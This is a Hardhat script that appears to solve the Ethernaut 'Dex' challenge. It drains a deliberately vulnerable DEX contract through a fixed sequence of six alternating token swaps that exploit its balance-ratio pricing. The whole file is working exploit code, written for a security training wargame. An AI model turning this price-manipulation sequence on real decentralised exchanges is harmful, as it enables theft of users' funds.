// @ts-ignore
import { web3, ethers } from "hardhat";

async function main() {
    const dex = await ethers.getContractFactory('Dex')
    const instance = await dex.attach('0x06404CD593A98867acB5308Ce44E495848b7509D')

    let token1Add = await instance.token1()
    let token2Add = await instance.token2()

    // Approved through console of Ethernaut
    // await instance.approve(instance.address, 500)

    let tx1 = await instance.swap(token1Add, token2Add, 10)
    await tx1.wait()
    let tx2 = await instance.swap(token2Add, token1Add, 20)
    await tx2.wait()
    let tx3 = await instance.swap(token1Add, token2Add, 24)
    await tx3.wait()
    let tx4 = await instance.swap(token2Add, token1Add, 30)
    await tx4.wait()
    let tx5 = await instance.swap(token1Add, token2Add, 41)
    await tx5.wait()

    //Final Step
    let final = await instance.swap(token2Add, token1Add, 45)
    await final.wait()

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
